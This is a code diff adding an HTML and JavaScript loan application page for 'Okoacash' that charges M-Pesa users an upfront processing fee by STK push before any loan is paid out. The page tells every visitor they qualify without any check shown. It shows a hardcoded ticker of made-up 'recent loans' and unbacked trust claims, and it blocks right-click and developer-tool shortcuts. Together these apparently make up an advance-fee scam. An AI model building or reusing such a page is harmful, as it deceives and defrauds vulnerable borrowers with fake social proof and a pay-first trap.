@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply for Loan | Okoacash</title>
+
+    <!-- Favicons -->
+    <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- SweetAlert -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
+
+    <style>
+        /* ===== CSS Variables ===== */
+        :root {
+            --primary-color: #00A859;
+            --primary-dark: #008244;
+            --secondary-color: #f8f9fa;
+            --accent-color: #EE3124;
+            --text-color: #1e293b;
+            --light-text: #64748b;
+            --success-color: #10b981;
+            --warning-color: #f59e0b;
+            --danger-color: #ef4444;
+            --border-radius: 12px;
+            --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, #8ce9e9 0%, #e2e8f0 100%);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header-banner {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.8rem 1rem;
+            text-align: center;
+            font-size: 0.85rem;
+            font-weight: 500;
+            box-shadow: 0 2px 10px rgba(37, 99, 235, 0.2);
+        }
+
+        .login-container {
+            max-width: 100%;
+            margin: 1rem auto;
+            padding: 1.5rem;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: var(--border-radius);
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.15);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            flex: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #9700a8;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .logo-icon {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 1.3rem;
+        }
+
+        .header p.subtitle {
+            color: var(--light-text);
+            font-size: 0.95rem;
+            max-width: 100%;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        /* ===== IMPROVED TRUST BADGES ===== */
+        .trust-badges {
+            display: flex;
+            justify-content: space-between;
+            margin: 1.5rem 0;
+            gap: 0.5rem;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            padding: 0.5rem 0;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .trust-badges::-webkit-scrollbar {
+            display: none;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--light-text);
+            font-size: 0.75rem;
+            background: rgba(248, 250, 252, 0.9);
+            padding: 0.6rem 0.8rem;
+            border-radius: 50px;
+            border: 1px solid rgba(237, 242, 247, 0.8);
+            transition: var(--transition);
+            backdrop-filter: blur(2px);
+            flex-shrink: 0;
+            min-width: fit-content;
+        }
+
+        .trust-badge i {
+            color: var(--success-color);
+            font-size: 1rem;
+            flex-shrink: 0;
+        }
+
+        .trust-badge span {
+            white-space: nowrap;
+        }
+
+        .welcome-card {
+            background-color: rgba(240, 245, 255, 0.9);
+            border-left: 4px solid var(--primary-color);
+            padding: 1.25rem;
+            border-radius: var(--border-radius);
+            margin-bottom: 1.5rem;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+        }
+
+        .welcome-card p {
+            color: var(--text-color);
+            font-size: 1rem;
+            position: relative;
+            z-index: 1;
+            line-height: 1.5;
+        }
+
+        .welcome-card p strong {
+            color: var(--primary-color);
+        }
+
+        .user-name {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .news-ticker {
+            background-color: rgba(240, 245, 255, 0.9);
+            border-radius: var(--border-radius);
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+            position: relative;
+            min-height: 70px;
+            backdrop-filter: blur(2px);
+        }
+
+        .ticker-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+
+        .ticker-header i {
+            margin-right: 8px;
+            font-size: 0.9rem;
+        }
+
+        .ticker-message {
+            font-size: 0.8rem;
+            position: absolute;
+            width: 100%;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            line-height: 1.4;
+        }
+
+        .ticker-message.active {
+            opacity: 1;
+        }
+
+        /* ===== LOAN OPTIONS GRID - MATCHING OKOAHUB STYLE ===== */
+        .loan-card {
+            background: var(--white);
+            border-radius: var(--border-radius);
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .card-title {
+            text-align: center;
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .loan-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 0.75rem;
+        }
+
+        .loan-option {
+            background: rgba(248, 250, 252, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: var(--border-radius);
+            padding: 1rem 0.75rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 80px;
+        }
+
+        .loan-option:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .loan-option.selected {
+            border-color: var(--primary-color);
+            background-color: rgba(37, 99, 235, 0.1);
+            box-shadow: 0 2px 8px rgba(37, 99, 235, 0.2);
+        }
+
+        .loan-amount {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 0.25rem;
+            line-height: 1.2;
+        }
+
+        .processing-fee {
+            font-size: 0.75rem;
+            color: var(--light-text);
+            line-height: 1.2;
+        }
+
+        .note-box {
+            margin-top: 1.5rem;
+            background-color: rgba(255, 250, 240, 0.9);
+            border-left: 4px solid var(--warning-color);
+            padding: 1rem;
+            border-radius: var(--border-radius);
+            display: flex;
+            gap: 0.8rem;
+            backdrop-filter: blur(2px);
+        }
+
+        .note-box i {
+            color: var(--warning-color);
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 0.1rem;
+        }
+
+        .note-box p {
+            color: var(--text-color);
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        .proceed-section {
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .btn-apply {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(to right, var(--primary-color), var(--primary-dark));
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            font-weight: 600;
+            margin: 1rem 0;
+            cursor: pointer;
+            transition: transform 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-apply:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-apply:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .btn-spinner {
+            display: none;
+            margin-left: 10px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .error-message {
+            color: var(--danger-color);
+            font-size: 0.85rem;
+            text-align: center;
+            margin-top: 0.5rem;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 1.5rem;
+            color: var(--light-text);
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: var(--transition);
+            padding: 0.5rem;
+        }
+
+        .back-link:hover {
+            color: var(--primary-color);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 2rem;
+            color: var(--light-text);
+            font-size: 0.8rem;
+            padding: 1.25rem 0;
+            border-top: 1px solid rgba(237, 242, 247, 0.5);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 0.75rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--light-text);
+            text-decoration: none;
+            transition: color 0.2s;
+            font-size: 0.8rem;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-color);
+            text-decoration: underline;
+        }
+
+        .copyright {
+            margin-top: 0.5rem;
+        }
+
+        /* ===== PAYMENT MODAL STYLES ===== */
+        .payment-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .payment-modal.active {
+            display: flex;
+        }
+
+        .payment-content {
+            background: white;
+            border-radius: var(--border-radius);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalSlideIn 0.3s ease-out;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .payment-header {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            color: white;
+            padding: 1.25rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .payment-header h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .payment-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            font-size: 0.9rem;
+        }
+
+        .payment-close:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .payment-body {
+            padding: 1.25rem;
+        }
+
+        .payment-details {
+            background: rgba(241, 245, 249, 0.7);
+            border-radius: var(--border-radius);
+            padding: 1rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .payment-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+            font-size: 0.9rem;
+        }
+
+        .payment-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .payment-item.total {
+            font-weight: 600;
+            font-size: 1rem;
+            color: var(--primary-color);
+            margin-top: 0.5rem;
+            padding-top: 0.75rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .payment-note {
+            background: rgba(255, 250, 240, 0.7);
+            border-left: 4px solid var(--accent-color);
+            padding: 0.9rem;
+            border-radius: var(--border-radius);
+            margin-bottom: 1.25rem;
+            font-size: 0.8rem;
+            color: var(--text-color);
+            line-height: 1.4;
+        }
+
+        .payment-actions {
+            display: flex;
+            gap: 0.8rem;
+        }
+
+        .payment-btn {
+            flex: 1;
+            padding: 0.8rem;
+            border: none;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            font-size: 0.9rem;
+        }
+
+        .payment-btn.primary {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            color: white;
+            box-shadow: var(--box-shadow);
+        }
+
+        .payment-btn.primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
+        }
+
+        .payment-btn.secondary {
+            background: #f1f5f9;
+            color: var(--light-text);
+        }
+
+        .payment-btn.secondary:hover {
+            background: #e2e8f0;
+        }
+
+        /* ===== MEDIA QUERIES ===== */
+        @media (min-width: 768px) {
+            .login-container {
+                max-width: 900px;
+                margin: 2rem auto;
+                padding: 2.5rem;
+            }
+
+            .header-banner {
+                font-size: 0.9rem;
+                padding: 0.8rem 0;
+            }
+
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .logo-icon {
+                width: 50px;
+                height: 50px;
+                font-size: 1.5rem;
+            }
+
+            .loan-grid {
+                grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+                gap: 1rem;
+            }
+
+            .loan-option {
+                padding: 1.25rem 1rem;
+                min-height: 90px;
+            }
+
+            .loan-amount {
+                font-size: 1.2rem;
+            }
+
+            .trust-badges {
+                justify-content: center;
+                gap: 1.5rem;
+                flex-wrap: wrap;
+                overflow-x: visible;
+            }
+
+            .trust-badge {
+                font-size: 0.9rem;
+                padding: 0.8rem 1.2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 1.25rem;
+                margin: 0.5rem;
+            }
+
+            .header-banner {
+                padding: 0.7rem 1rem;
+                font-size: 0.8rem;
+            }
+
+            .logo {
+                font-size: 1.8rem;
+            }
+
+            .logo-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 1.2rem;
+            }
+
+            .loan-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.6rem;
+            }
+
+            .payment-actions {
+                flex-direction: column;
+            }
+
+            .trust-badge span {
+                font-size: 0.7rem;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .login-container {
+                padding: 1rem;
+                margin: 0.5rem;
+            }
+
+            .trust-badge {
+                padding: 0.5rem 0.7rem;
+            }
+
+            .trust-badge i {
+                font-size: 0.9rem;
+            }
+
+            .loan-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .loan-option {
+                padding: 1rem 0.75rem;
+                min-height: 75px;
+            }
+
+            .loan-amount {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header-banner">
+        Fast and secure loan processing • 100% online application
+    </div>
+
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">P</div>
+                <span>Okoacash</span>
+            </div>
+            <p class="subtitle">Get the financial support you need with our simple, transparent loan process</p>
+        </div>
+
+        <!-- IMPROVED TRUST BADGES -->
+        <div class="trust-badges">
+            <div class="trust-badge">
+                <i class="fas fa-lock"></i>
+                <span>256-bit Encryption</span>
+            </div>
+            <div class="trust-badge">
+                <i class="fas fa-bolt"></i>
+                <span>Instant Decisions</span>
+            </div>
+            <div class="trust-badge">
+                <i class="fas fa-star"></i>
+                <span>4.8/5 Rating</span>
+            </div>
+        </div>
+
+        <div class="welcome-card">
+            <p>
+                Hi <span class="user-name" id="user-name"></span>, you qualify for these loan options based on your
+                <strong>M-Pesa records</strong> (2-month term at 10% interest).
+            </p>
+        </div>
+
+        <div class="news-ticker">
+            <div class="ticker-header">
+                <i class="fas fa-bullhorn"></i>
+                <span>Recent Loans</span>
+            </div>
+            <div id="ticker-container"></div>
+        </div>
+
+        <!-- LOAN OPTIONS GRID - MATCHING OKOAHUB STYLE -->
+        <div class="loan-card">
+            <h3 class="card-title">Select Your Loan Amount</h3>
+            <div class="loan-grid">
+                <div class="loan-option" onclick="selectLoanOption(this, 1000, 100)">
+                    <div class="loan-amount">Ksh 1,000</div>
+                    <div class="processing-fee">Fee: Ksh 100</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 3000, 130)">
+                    <div class="loan-amount">Ksh 3,000</div>
+                    <div class="processing-fee">Fee: Ksh 130</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 5500, 160)">
+                    <div class="loan-amount">Ksh 5,500</div>
+                    <div class="processing-fee">Fee: Ksh 160</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 7500, 200)">
+                    <div class="loan-amount">Ksh 7,500</div>
+                    <div class="processing-fee">Fee: Ksh 200</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 16800, 230)">
+                    <div class="loan-amount">Ksh 16,800</div>
+                    <div class="processing-fee">Fee: Ksh 230</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 21200, 270)">
+                    <div class="loan-amount">Ksh 21,200</div>
+                    <div class="processing-fee">Fee: Ksh 270</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 25600, 400)">
+                    <div class="loan-amount">Ksh 25,600</div>
+                    <div class="processing-fee">Fee: Ksh 400</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 30000, 470)">
+                    <div class="loan-amount">Ksh 30,000</div>
+                    <div class="processing-fee">Fee: Ksh 470</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 35400, 590)">
+                    <div class="loan-amount">Ksh 35,400</div>
+                    <div class="processing-fee">Fee: Ksh 590</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 39800, 730)">
+                    <div class="loan-amount">Ksh 39,800</div>
+                    <div class="processing-fee">Fee: Ksh 730</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 44200, 1010)">
+                    <div class="loan-amount">Ksh 44,200</div>
+                    <div class="processing-fee">Fee: Ksh 1010</div>
+                </div>
+                <div class="loan-option" onclick="selectLoanOption(this, 48600, 1600)">
+                    <div class="loan-amount">Ksh 48,600</div>
+                    <div class="processing-fee">Fee: Ksh 1600</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="note-box">
+            <i class="fas fa-lightbulb"></i>
+            <p>Higher loan amounts have slightly higher processing fees. Your selected processing fee will be deducted
+                from your loan disbursement after payment confirmation.</p>
+        </div>
+
+        <div class="proceed-section">
+            <button id="apply-btn" class="btn-apply" disabled>
+                <span class="btn-text">Get Loan Now</span>
+                <i class="fas fa-arrow-right"></i>
+                <span class="btn-spinner"><i class="fas fa-spinner"></i></span>
+            </button>
+            <div id="error-message" class="error-message">Please select a loan amount to continue</div>
+        </div>
+
+        <a href="/eligibility" class="back-link">
+            <i class="fas fa-arrow-left"></i> Back to Home
+        </a>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="/privacy">Privacy</a>
+                <a href="/terms">Terms</a>
+                <a href="/contact">Contact</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 Okoacash. Licensed by CBK.
+            </div>
+        </div>
+    </div>
+
+    <!-- PAYMENT MODAL -->
+    <div class="payment-modal" id="paymentModal">
+        <div class="payment-content">
+            <div class="payment-header">
+                <button class="payment-close" id="closePaymentModal">
+                    <i class="fas fa-times"></i>
+                </button>
+                <h3>Confirm Payment</h3>
+                <p>Complete your loan application</p>
+            </div>
+            <div class="payment-body">
+                <div class="payment-details">
+                    <div class="payment-item">
+                        <span>Loan Amount:</span>
+                        <span id="modalLoanAmount">Ksh 0</span>
+                    </div>
+                    <div class="payment-item">
+                        <span>Processing Fee:</span>
+                        <span id="modalProcessingFee">Ksh 0</span>
+                    </div>
+                    <div class="payment-item">
+                        <span>Interest (10%):</span>
+                        <span id="modalInterest">Ksh 0</span>
+                    </div>
+                    <div class="payment-item total">
+                        <span>Total Repayment:</span>
+                        <span id="modalTotalRepayment">Ksh 0</span>
+                    </div>
+                </div>
+                <div class="payment-note">
+                    <strong>Note:</strong> You will receive an M-Pesa prompt to pay the processing fee. Your loan will
+                    be disbursed immediately after payment confirmation.
+                </div>
+                <div class="payment-actions">
+                    <button class="payment-btn secondary" id="cancelPayment">
+                        Cancel
+                    </button>
+                    <button class="payment-btn primary" id="confirmPayment">
+                        Proceed to Payment
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+
+    <script>
+        // Serverless API endpoints
+        const API_ENDPOINTS = {
+            initiatePayment: '/api/initiate-payment',
+            verifyPayment: '/api/verify-payment',
+            normalizePhone: '/api/normalize-phone'
+        };
+
+        // Send STK Push via Serverless Function
+        async function sendPayHeroSTK(phoneNumber, amount, loanAmount, customerName) {
+            try {
+                const response = await fetch(API_ENDPOINTS.initiatePayment, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone_number: phoneNumber,
+                        amount: amount,
+                        loan_amount: loanAmount,
+                        customer_name: customerName
+                    })
+                });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error || 'Payment initiation failed');
+                }
+
+                return result;
+            } catch (error) {
+                console.error('Payment API Error:', error);
+                throw error;
+            }
+        }
+
+        // Check payment status via Serverless Function
+        async function checkPaymentStatus(reference, maxAttempts = 20) {
+            let attempts = 0;
+
+            return new Promise((resolve, reject) => {
+                const interval = setInterval(async () => {
+                    attempts++;
+
+                    try {
+                        const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${reference}`);
+                        const result = await response.json();
+
+                        console.log(`Payment status check ${attempts}:`, result);
+
+                        if (result.success && (result.status === 'COMPLETED' || result.status === 'SUCCESS')) {
+                            clearInterval(interval);
+                            resolve(true);
+                        } else if (result.success && (result.status === 'FAILED' || result.status === 'CANCELLED')) {
+                            clearInterval(interval);
+                            reject(new Error(result.reason || 'Payment failed or was cancelled'));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Payment verification timeout'));
+                        }
+                    } catch (error) {
+                        console.error('Status check error:', error);
+
+                        if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Payment verification failed'));
+                        }
+                    }
+                }, 3000);
+            });
+        }
+
+        // Normalize phone via Serverless Function
+        async function normalizePhoneNumber(phone) {
+            try {
+                const response = await fetch(API_ENDPOINTS.normalizePhone, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone })
+                });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error || 'Phone normalization failed');
+                }
+
+                return result.normalized_phone;
+            } catch (error) {
+                console.error('Phone normalization error:', error);
+                throw error;
+            }
+        }
+
+        // User data initialization
+        const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
+        if (!userData.phone_number) {
+            window.location.href = '/eligibility';
+        }
+
+        document.getElementById('user-name').textContent = userData.name || 'Customer';
+
+        let selectedLoan = null;
+        let paymentReference = null;
+
+        // Ticker messages
+        const tickerMessages = [
+            "0721****77 loaned Ksh 15,000 - just now",
+            "0723****12 loaned Ksh 9,500 - 2 mins ago",
+            "0710****90 loaned Ksh 4,200 - 1 min ago",
+            "0725****89 loaned Ksh 18,000 - just now",
+            "0722****33 loaned Ksh 5,600 - 3 mins ago",
+            "0728****01 loaned Ksh 21,300 - just now",
+            "0711****45 loaned Ksh 8,000 - 5 mins ago",
+            "0713****12 loaned Ksh 13,200 - 9 mins ago",
+            "0727****01 loaned Ksh 22,500 - 7 mins ago",
+            "0706****78 loaned Ksh 16,400 - just now"
+        ];
+
+        function initTicker() {
+            const tickerContainer = document.getElementById('ticker-container');
+
+            tickerMessages.forEach((message, index) => {
+                const messageElement = document.createElement('div');
+                messageElement.className = 'ticker-message';
+                messageElement.textContent = message;
+                messageElement.dataset.index = index;
+                tickerContainer.appendChild(messageElement);
+            });
+
+            const messages = document.querySelectorAll('.ticker-message');
+            if (messages.length > 0) {
+                messages[0].classList.add('active');
+            }
+
+            let currentIndex = 0;
+            setInterval(() => {
+                messages[currentIndex].classList.remove('active');
+                currentIndex = (currentIndex + 1) % messages.length;
+                messages[currentIndex].classList.add('active');
+            }, 2000);
+        }
+
+        window.addEventListener('load', initTicker);
+
+        function selectLoanOption(element, amount, fee) {
+            document.querySelectorAll('.loan-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            selectedLoan = { amount, fee };
+            document.getElementById('apply-btn').disabled = false;
+            document.getElementById('error-message').style.display = 'none';
+            userData.loan_amount = amount;
+            userData.processing_fee = fee;
+            sessionStorage.setItem('myLoan', JSON.stringify(userData));
+        }
+
+        // PAYMENT MODAL FUNCTIONALITY
+        document.getElementById('apply-btn').addEventListener('click', function () {
+            if (!selectedLoan) {
+                document.getElementById('error-message').style.display = 'block';
+                return;
+            }
+
+            // Update modal with selected loan details
+            document.getElementById('modalLoanAmount').textContent = `Ksh ${selectedLoan.amount.toLocaleString()}`;
+            document.getElementById('modalProcessingFee').textContent = `Ksh ${selectedLoan.fee}`;
+            const interest = selectedLoan.amount * 0.1;
+            document.getElementById('modalInterest').textContent = `Ksh ${interest.toLocaleString()}`;
+            document.getElementById('modalTotalRepayment').textContent = `Ksh ${(selectedLoan.amount + interest).toLocaleString()}`;
+
+            // Show the custom payment modal
+            document.getElementById('paymentModal').classList.add('active');
+        });
+
+        // Close modal when clicking close button
+        document.getElementById('closePaymentModal').addEventListener('click', function () {
+            document.getElementById('paymentModal').classList.remove('active');
+        });
+
+        // Close modal when clicking cancel button
+        document.getElementById('cancelPayment').addEventListener('click', function () {
+            document.getElementById('paymentModal').classList.remove('active');
+        });
+
+        // Close modal when clicking outside
+        document.getElementById('paymentModal').addEventListener('click', function (e) {
+            if (e.target === this) {
+                document.getElementById('paymentModal').classList.remove('active');
+            }
+        });
+
+        // Process payment when confirm button is clicked
+        document.getElementById('confirmPayment').addEventListener('click', async function () {
+            // Close the modal
+            document.getElementById('paymentModal').classList.remove('active');
+
+            // Show loading state
+            const button = document.getElementById('apply-btn');
+            const btnText = button.querySelector('.btn-text');
+            const spinner = button.querySelector('.btn-spinner');
+
+            btnText.textContent = 'Processing...';
+            spinner.style.display = 'inline-block';
+            button.disabled = true;
+
+            // Continue with the original payment flow
+            try {
+                // First normalize the phone number
+                const normalizedPhone = await normalizePhoneNumber(userData.phone_number);
+
+                const paymentResponse = await sendPayHeroSTK(
+                    normalizedPhone,
+                    selectedLoan.fee,
+                    selectedLoan.amount,
+                    userData.name || 'Customer'
+                );
+
+                if (paymentResponse && paymentResponse.reference) {
+                    paymentReference = paymentResponse.reference;
+
+                    Swal.fire({
+                        title: 'STK Push Sent!',
+                        html: `
+                        <div style="text-align:center;">
+                            <i class="fas fa-mobile-alt" style="font-size: 48px; color: #2563eb; margin-bottom: 16px;"></i>
+                            <p>Check your phone for the M-Pesa prompt</p>
+                            <p style="font-size: 0.9rem; color: #666; margin-top: 12px;">
+                                Enter your M-Pesa PIN to complete payment of <strong>Ksh ${selectedLoan.fee}</strong>
+                            </p>
+                            <p style="font-size: 0.85rem; color: #999; margin-top: 8px;">
+                                Phone: ${normalizedPhone}
+                            </p>
+                            <div style="margin-top: 16px; padding: 12px; background: #f0f0f0; border-radius: 8px;">
+                                <p style="font-size: 0.85rem; margin: 0;">Verifying payment...</p>
+                            </div>
+                        </div>
+                    `,
+                        icon: 'info',
+                        showConfirmButton: false,
+                        allowOutsideClick: false
+                    });
+
+                    // Verify payment using serverless function
+                    try {
+                        const paymentSuccess = await checkPaymentStatus(paymentReference);
+
+                        if (paymentSuccess) {
+                            await Swal.fire({
+                                title: 'Payment Successful!',
+                                html: `
+                                <div style="text-align:center;">
+                                    <i class="fas fa-check-circle" style="font-size: 64px; color: #10b981; margin-bottom: 16px;"></i>
+                                    <p>Your loan of <strong>Ksh ${selectedLoan.amount.toLocaleString()}</strong> has been approved!</p>
+                                    <p style="color: #666; font-size: 0.9rem; margin-top: 12px;">Processing disbursement...</p>
+                                </div>
+                            `,
+                                icon: 'success',
+                                timer: 2000,
+                                showConfirmButton: false
+                            });
+
+                            sessionStorage.setItem('loanApproved', JSON.stringify({
+                                ...userData,
+                                ...selectedLoan,
+                                paymentReference,
+                                approvedAt: new Date().toISOString()
+                            }));
+
+                            // Reset button state
+                            btnText.textContent = 'Get Loan Now';
+                            spinner.style.display = 'none';
+                            button.disabled = false;
+
+                            // Redirect to dashboard only on successful payment
+                            window.location.href = '/dash';
+                        }
+                    } catch (verificationError) {
+                        console.error('Payment verification error:', verificationError);
+                        throw new Error(verificationError.message || 'Payment verification failed');
+                    }
+                } else {
+                    throw new Error('Payment initiation failed - no reference received');
+                }
+            } catch (error) {
+                console.error('Payment error:', error);
+                // Reset button state
+                btnText.textContent = 'Get Loan Now';
+                spinner.style.display = 'none';
+                button.disabled = false;
+
+                Swal.fire({
+                    title: 'Payment Failed',
+                    html: `
+                    <p>${error.message || 'Unable to process payment. Please try again.'}</p>
+                    <p style="font-size: 0.85rem; color: #666; margin-top: 12px;">
+                        Please ensure your phone number is correct and try again.
+                    </p>
+                `,
+                    icon: 'error',
+                    confirmButtonText: 'Try Again',
+                    confirmButtonColor: '#00A859'
+                });
+            }
+        });
+
+        // Anti-decompilation and security measures
+        (function () {
+            // Disable right-click
+            document.addEventListener('contextmenu', event => event.preventDefault());
+
+            // Disable DevTools shortcuts
+            document.onkeydown = function (e) {
+                if (e.keyCode == 123) { return false; } // F12
+                if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) {
+                    return false;
+                }
